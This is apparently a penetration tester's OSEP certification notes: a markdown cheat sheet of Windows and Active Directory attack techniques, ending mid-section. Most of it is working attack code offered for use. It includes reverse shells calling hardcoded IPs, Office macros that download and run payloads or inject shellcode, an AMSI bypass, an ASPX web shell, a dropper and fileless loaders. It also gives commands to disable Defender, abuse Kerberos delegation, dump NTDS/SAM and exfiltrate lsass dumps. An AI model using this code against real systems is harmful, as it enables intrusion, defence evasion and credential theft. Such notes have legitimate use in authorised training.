# OSEP-Notes

## Initial Access
### HTA Fileless Initial Access Reverse Shell (AppLocker + CLM + Defender Bypass) 

Scenario: You can make a user execute your malicious HTA files, but AppLocker, CLM, and Defender block all payloads.

To get a fileless reverse shell, one method that worked for me is via LOLBIN InstallUtil.

In attacker dev machine, write the following code to temp.cs:

```csharp
using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Linq;
using System.Text;


namespace Exec
{
	public class Program
	{

		public static void Main()
		{
			Console.WriteLine("Hello From Main :p");

		}
	}
	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err) { }
			}
		}
		static StreamWriter streamWriter;
		public override void Uninstall(System.Collections.IDictionary savedState) {
			using (TcpClient client = new TcpClient("192.168.45.218", 8085))
			{
				using (Stream stream = client.GetStream())
				{
					using (StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while (true)
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}
	}
		

}
```

Compile it with csc
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe .\temp.cs
```

Now, we can simply make the victim user execute the following hta:
```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe /c \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U \\\\192.168.45.218\\pwn\\temp.exe\"");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```
---
### Reverse Shell with Office Macro
Macro:
```vbs
Function MyMacro()
Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("powershell -c IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/stage1.ps1')")
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
Stage1:
```powershel
IEX(New-Object Net.WebClient).downloadString("http://172.31.17.142:8080/ref.txt")
IEX(New-Object Net.WebClient).downloadString("http://172.31.17.142:8080/stage2.txt")
```
ref.txt (AMSI bypass):
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static'); Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}; $g=$f.setValue($null, $true)
```
stage2.txt:
```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 172.31.17.142 -Port 80
```
---
### Shellcode Exec with Office Macro
Payload gen:
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```

Macro:
```vbs
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
---
### Web Shell
Web shell code:

```aspx
<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");
	
	// build nav for path literal
	string[] dirparts = dir.Split('/');
	string linkwalk = "";	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + "/";
		outstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
									HttpUtility.UrlEncode(linkwalk),
									HttpUtility.HtmlEncode(curpart));
	}
	lblPath.Text = outstr;
	
	// create drive list
	outstr = "";
	foreach(DriveInfo curdrive in DriveInfo.GetDrives())
	{
		if (!curdrive.IsReady)
			continue;
		string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
		outstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
									HttpUtility.UrlEncode(driveRoot),
									HttpUtility.HtmlEncode(driveRoot));
	}
	lblDrives.Text = outstr;

	// send file ?
	if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
	{
		Response.ClearContent();
		Response.WriteFile(Request.QueryString["get"]);
		Response.End();
	}

	// delete file ?
	if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
		File.Delete(Request.QueryString["del"]);	

	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}

	// enum directory and generate listing in the right pane
	DirectoryInfo di = new DirectoryInfo(dir);
	outstr = "";
	foreach (DirectoryInfo curdir in di.GetDirectories())
	{
		string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curdir.Name),
									HttpUtility.HtmlEncode(curdir.Name));
		outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
	}
	foreach (FileInfo curfile in di.GetFiles())
	{
		string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curfile.Name),
									HttpUtility.HtmlEncode(curfile.Name));
		string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
									HttpUtility.UrlEncode(dir),
									HttpUtility.UrlEncode(dir + "/" + curfile.Name));
		outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
	}
	lblDirOut.Text = outstr;

	// exec cmd ?
	if (txtCmdIn.Text.Length > 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = "";
	}	
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
	<style type="text/css">
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #CCCCCC; }
		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
		th { text-align: left; background-color: #99CC99; }
		td { background-color: #CCFFCC; }
		pre { margin: 2px; }
	</style>
</head>
<body>
	<h1>ASPX Shell by LT</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2>Shell</h2>				
				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
				<asp:Button runat="server" ID="cmdExec" Text="Execute" />
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
			</td>
			<td style="width: 50%; vertical-align: top;">
				<h2>File Browser</h2>
				<p>
					Drives:<br />
					<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
				</p>
				<p>
					Working directory:<br />
					<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
				</p>
				<table style="width: 100%">
					<tr>
						<th>Name</th>
						<th>Size KB</th>
						<th style="width: 50px">Actions</th>
					</tr>
					<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
				</table>
				<p>Upload to this directory:<br />
				<asp:FileUpload runat="server" ID="flUp" />
				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
				</p>
			</td>
		</tr>
    </table>

    </form>
</body>
</html>
```
---

### JScript Payload Dropper
file.js:
```javascript
var url = "http://192.168.119.120/pay.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("pay.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("pay.exe");
```
---
### Send mail with swaks
```
swaks --to support@domain.local --from "test@test.com" --header "Subject: Internal web app" --body "http://10.10.14.99:8000/" --server 192.168.13.14 --attach-type application/pdf --attach=file1.pdf
```
---
## Execution
### PowerShell Fileless Execute .NET Assembly
```powershell
$code = @'
using System;
using Reflect = System.Reflection;
using System.IO;
using System.Text;

    public class Assembly
    {
        public static void AssemblyExecute(byte[] bytes, string[] args = null)
        {
            MemoryStream stream = new MemoryStream();
            var realStdOut = Console.Out;
            var realStdErr = Console.Error;
            StreamWriter stdOutWriter = new StreamWriter(stream);
            StreamWriter stdErrWriter = new StreamWriter(stream);
            stdOutWriter.AutoFlush = true;
            stdErrWriter.AutoFlush = true;
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);
            var asm = Reflect.Assembly.Load(bytes);
            try { asm.EntryPoint.Invoke(null, new object[] { args }); }
            catch (IOException) {}
            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);
            var final = Encoding.UTF8.GetString(stream.ToArray());
            stream.Dispose();
            byte[] DataBytes = Encoding.UTF8.GetBytes(final);
            string result = System.Text.Encoding.UTF8.GetString(DataBytes);
            Console.WriteLine(result);
        }
    }
'@

Add-Type -TypeDefinition $code
$url="http://10.13.14.15:8080/asm.exe"
[string[]]$arguments = "dump /nowrap".Split(' ')
$wc = New-Object System.Net.WebClient
[byte[]]$bytes = $wc.DownloadData($url)
[Assembly]::AssemblyExecute($bytes,$arguments)
```
---
### PowerShell Fileless Self Inyector
```powershell
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])] 
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    Write-Output $TypeBuilder.CreateType()
}
$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
$CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
$url="http://10.13.14.15:8080/bacon.bin";
$wc = New-Object System.Net.WebClient;
[Byte[]] $safecode = $wc.DownloadData($url);
$size = $safecode.Length;
$MemoryHandle = [IntPtr]::Zero
$MemoryHandle = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40);
Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkc2FmZWNvZGUsIDAsICRNZW1vcnlIYW5kbGUsICRzaXplKSB8IE91dC1OdWxs")))
$ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, ([UInt32]0), ([IntPtr]0))
```
---
### Bypass CLM
Fileless reverse shell with full language mode:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U \\10.13.14.15\pwn\PSBypassCLM.exe
```

https://github.com/florylsk/active-directory-hacktools/blob/main/PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe

---

### Bypass AppLocker
World writable folders that usually bypass it:
```
C:\Windows\Tasks 

C:\Windows\Temp 

C:\windows\tracing

C:\Windows\Registration\CRMLog

C:\Windows\System32\FxsTmp

C:\Windows\System32\com\dmp

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\PRINTERS

C:\Windows\System32\spool\SERVERS

C:\Windows\System32\spool\drivers\color

C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)

C:\Windows\SysWOW64\FxsTmp

C:\Windows\SysWOW64\com\dmp

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

Execution of .NET Assemblies with InstallUtil:

assembly.cs
```csharp
using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Linq;
using System.Text;


namespace Exec
{
	public class Program
	{

		public static void Main()
		{
			Console.WriteLine("Hello From Main :p");

		}
	}
	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		public override void Uninstall(System.Collections.IDictionary savedState) {
			<malcode>
		}
	}
		
}
```

Compile with csc.exe:
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe .\assembly.cs
```

Execute with InstallUtil:
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U \\192.168.45.218\pwn\assembly.exe
```
---
### Port Forward
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=192.168.58.128 connectport=8080 connectaddress=192.168.57.140
netsh advfirewall firewall add rule name="PortForwarding 8080" dir=in action=allow protocol=TCP localport=8080
netsh advfirewall firewall add rule name="PortForwarding 8080" dir=out action=allow protocol=TCP localport=8080
```

## Persistence
### Disable AV
```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```

### Enable WinRM
```
Enable-PSRemoting -Force;Set-Item wsman:\localhost\client\trustedhosts *
```
## Privesc
### DNSADMINS group
```powershell
dnscmd.exe /config /serverlevelplugindll \\10.10.14.57\s\shell.dll;sc.exe \\DCName stop dns;sc.exe \\DCName start dns
```
---
### seBackupPrivilege/seRestorePrivilege DCSYNC
```powershell
reg save hklm\sam sam; reg save hklm\system system
unix2dos shadowcopy.txt (in linux attacker machine)
//upload shadowcopy.txt to the machine
diskshadow /s shadowcopy.txt
robocopy /B E:\Windows\ntds .\ntds ntds.dit
//exfiltrate the files and perform dcsync locally
```

shadowcopy.txt:
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

### Constrained Delegation
svc_sql user has constrained delegation for SPN "time/M3WEBAW.M3C.LOCAL" for host m3webaw. That means we can impersonate any user on that host for that SPN, however, we can edit the SPN to use any service such as ldap, rpscss, host, wsman, etc.
To exploit it, we can do the following.
First, get base64 encoded ticket for the svc_sql user.
```
./rubeus.exe tgtdeleg /nowrap
```
Now, we can use Rubeus to get TGS for IT Admins user in M3WEBAW.
```
./rubeus.exe s4u /impersonateuser:LORRAINE.MCDONALD /ptt /altservice:http,rpcss,host,wsman,ldap,cifs /msdsspn:"time/M3WEBAW.M3C.LOCAL" /ticket:<base64 ticket>
```
Finally, we can just use PSRemote to get into M3WEBAW with our TGS tickets.
```
Enter-PSSession -ComputerName M3WEBAW.M3C.LOCAL
```

### Resource Based Constrained Delegation (genericWrite over host)
Some pre-requirements:
```powershell
iwr http://10.10.15.51:8080/Rubeus.exe -o rubeus.exe
#AMSI Bypass
IEX(New-Object Net.WebClient).downloadString("http://10.10.15.51:8080/bypass.ms1")
IEX(New-Object Net.WebClient).downloadString("http://10.10.15.51:8080/PowerView.ps1")
IEX(New-Object Net.WebClient).downloadString("http://10.10.15.51:8080/Powermad.ps1")
```

RBCD Attack:
```powershell
New-MachineAccount -MachineAccount attackersyste -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
$ComputerSid = Get-DomainComputer attackersyste -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
./rubeus.exe hash /password:Summer2018! /domain:m3c.local /user:attackersyste$
./rubeus.exe s4u /user:attackersyste$ /aes256:FB0E89A034E9FCCF80298ACBB79BF7D866B44FA9D3A222C568A6EC6F2D8103AA /impersonateuser:JOHN.CLARK /msdsspn:ldap/M3DC.m3c.local /ptt
./rubeus.exe dump /nowrap
[IO.File]::WriteAllBytes("C:\users\svc_apache\desktop\ldap.kirbi", [Convert]::FromBase64String("<b64ticket>"))
Invoke-WebRequest -uri http://10.10.15.51:8080/ldap.kirbi -Method Put -Infile ldap.kirbi -ContentType 'application/binary'
```
## Credential Access
### Local DCSYNC
```
ntdsutil.exe 'ac i ntds' 'ifm' 'create full $env:TEMP' q q
```


## Lateral Movement
### WinRM
```powershell
$pass=ConvertTo-SecureString "myPass" -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential("domain.local\username",$pass)
Invoke-Command -Computer DC-1 -Credential $cred -ScriptBlock { systeminfo }
```
---
### SMB
```
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\victim.domain.com powershell.exe
```
---
### SSH ControlMaster Hijacking
1. Create file ```~/.ssh/config``` with content:
```
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```
2. ```chmod 644 ~/.ssh/config```

3. Create folder ```~/.ssh/controlmaster```

4. If you are root, you can now do:
```bash
ssh -S /home/victim/.ssh/controlmaster/victim\@linuxvictim\:22 victim@linuxvictim
```
5. Otherwise, just use ssh normally without pass if you are logged in as the user with controlmaster hijacking activated.
---
### Ansible Abuse
Enumerate hosts from controller:
```bash
cat /etc/ansible/hosts
```

Execute command:
```bash
ansible victims -a "whoami"
ansible victims -a "whoami" --become # as root or the user appended after become arg
```

Example playbook with credentials stored:
```
---
- name: test
  hosts: all
  gather_facts: true
  become: yes
  become_user: testuser
  vars:
    ansible_become_pass: testpass
  tasks:
    - copy:
          content: "testings"
          dest: "/home/testuser/written_by_ansible.txt"
          mode: 0644
          owner: testuser
          group: testuser
```

Execute playbook:
```bash
ansible-playbook writefile.yaml
```

If ansible playbook has hashes pass, convert to john with:
```bash
python3 /usr/share/john/ansible2john.py ./test.yml
```

If you have the privs, also possible to decrypt directly with:
```
cat pw.txt | ansible-vault decrypt # pw.txt contais only the hashed pass, not the full playbook
```

### Linux Kerberos Exp
Steal keytab file if you are root:
```bash
kinit administrator@evil.corp -k -t /tmp/administrator.keytab
```

If the tickets are expired:
```bash
kinit -R
```

Smbclient with kerberos:
```bash
smbclient -k -U "evil.corp\administrator" //DC.evil.corp/C$
```

Hijack ccache files:
```bash
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown hackermen:hackermen /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow
```
## Command and Control
### Meterpreter
Gen payload:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.241 LPORT=4444 --encoder x64/zutto_dekiru --format psh
```

Start listener:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run
```

Socks proxy:
```
use post/multi/manage/autoroute
set SUBNET 172.16.224.1/24
set SESSION 1
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run
```

Privesc:
```
search windows local
use exploit/windows/local/cve_2022_21882_win32k
set LHOST tun0
set SESSION 1
run
```
## Exfiltration
### With simple HTTP server
Server-side python code:
```python
#!/usr/env python3
import http.server
import os
import logging

try:
    import http.server as server
except ImportError:
    # Handle Python 2.x
    import SimpleHTTPServer as server

class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
    """
    SimpleHTTPServer with added bonus of:

    - handle PUT requests
    - log headers in GET request
    """

    def do_GET(self):
        server.SimpleHTTPRequestHandler.do_GET(self)
        logging.warning(self.headers)

    def do_PUT(self):
        """Save a file following a HTTP PUT request"""
        filename = os.path.basename(self.path)

        # Don't overwrite files
        if os.path.exists(filename):
            self.send_response(409, 'Conflict')
            self.end_headers()
            reply_body = '"%s" already exists\n' % filename
            self.wfile.write(reply_body.encode('utf-8'))
            return

        file_length = int(self.headers['Content-Length'])
        with open(filename, 'wb') as output_file:
            output_file.write(self.rfile.read(file_length))
        self.send_response(201, 'Created')
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode('utf-8'))

if __name__ == '__main__':
    server.test(HandlerClass=HTTPRequestHandler,port=8080)
```
Client side powershell:
```powershell
Invoke-WebRequest -uri http://10.10.13.34:8080/lsass.txt -Method Put -Infile .\lsass.txt -ContentType 'application/binary'
```

Client side cmd:
```
